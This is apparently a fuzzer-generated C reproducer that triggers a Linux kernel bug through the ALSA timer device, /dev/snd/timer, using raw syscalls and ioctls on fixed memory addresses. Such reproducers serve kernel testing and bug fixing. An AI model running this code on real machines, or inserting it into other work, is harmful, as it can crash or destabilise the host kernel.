#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/mman.h>

static long r[44];

static void thr(int arg)
{
	switch ((long)arg) {
	case 0:
		mmap((void*)0x20000000, 10 << 20, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_SHARED, -1, 0);
		memcpy((void*)0x2000c235, "\x2f\x64\x65\x76\x2f\x73\x6e\x64\x2f\x74\x69\x6d\x65\x72\x00", 15);
		r[1] = syscall(SYS_open, 0x2000c235ul, 0x0ul, 0x103000ul, 0, 0, 0);
		break;
	case 1:
		*(uint32_t*)0x20014000 = (uint32_t)0x1;
		*(uint32_t*)0x20014004 = (uint32_t)0x5;
		*(uint32_t*)0x20014008 = (uint32_t)0xffffffffffffff00;
		*(uint32_t*)0x2001400c = (uint32_t)0x3;
		*(uint32_t*)0x20014010 = (uint32_t)0x0;
		*(uint8_t*)0x20014014 = (uint8_t)0x0;
		*(uint8_t*)0x20014015 = (uint8_t)0x0;
		*(uint8_t*)0x20014016 = (uint8_t)0x0;
		*(uint8_t*)0x20014017 = (uint8_t)0x0;
		*(uint8_t*)0x20014018 = (uint8_t)0x0;
		*(uint8_t*)0x20014019 = (uint8_t)0x0;
		*(uint8_t*)0x2001401a = (uint8_t)0x0;
		*(uint8_t*)0x2001401b = (uint8_t)0x0;
		*(uint8_t*)0x2001401c = (uint8_t)0x0;
		*(uint8_t*)0x2001401d = (uint8_t)0x0;
		*(uint8_t*)0x2001401e = (uint8_t)0x0;
		*(uint8_t*)0x2001401f = (uint8_t)0x0;
		*(uint8_t*)0x20014020 = (uint8_t)0x0;
		*(uint8_t*)0x20014021 = (uint8_t)0x0;
		*(uint8_t*)0x20014022 = (uint8_t)0x0;
		*(uint8_t*)0x20014023 = (uint8_t)0x0;
		*(uint8_t*)0x20014024 = (uint8_t)0x0;
		*(uint8_t*)0x20014025 = (uint8_t)0x0;
		*(uint8_t*)0x20014026 = (uint8_t)0x0;
		*(uint8_t*)0x20014027 = (uint8_t)0x0;
		*(uint8_t*)0x20014028 = (uint8_t)0x0;
		*(uint8_t*)0x20014029 = (uint8_t)0x0;
		*(uint8_t*)0x2001402a = (uint8_t)0x0;
		*(uint8_t*)0x2001402b = (uint8_t)0x0;
		*(uint8_t*)0x2001402c = (uint8_t)0x0;
		*(uint8_t*)0x2001402d = (uint8_t)0x0;
		*(uint8_t*)0x2001402e = (uint8_t)0x0;
		*(uint8_t*)0x2001402f = (uint8_t)0x0;
		*(uint8_t*)0x20014030 = (uint8_t)0x0;
		*(uint8_t*)0x20014031 = (uint8_t)0x0;
		*(uint8_t*)0x20014032 = (uint8_t)0x0;
		*(uint8_t*)0x20014033 = (uint8_t)0x0;
		r[39] = syscall(SYS_ioctl, r[1], 0x40345410ul, 0x20014000ul, 0, 0, 0);
		break;
	case 2:
		r[40] = syscall(SYS_ioctl, r[1], 0x5422ul, 0, 0, 0, 0);
		break;
	case 3:
		memcpy((void*)0x2000f2a3, "\x2f\x64\x65\x76\x2f\x73\x6e\x64\x2f\x74\x69\x6d\x65\x72\x00", 15);
		r[42] = syscall(SYS_open, 0x2000f2a3ul, 0x0ul, 0x40000ul, 0, 0, 0);
		break;
	case 4:
//		r[43] = syscall(SYS_dup2, r[42], r[1], 0, 0, 0, 0);
		break;
	}
}

int main()
{
	long i;

	memset(r, -1, sizeof(r));
	for (i = 0; i < 5; i++) {
		thr(i);
	}
	usleep(100000);
	return 0;
}

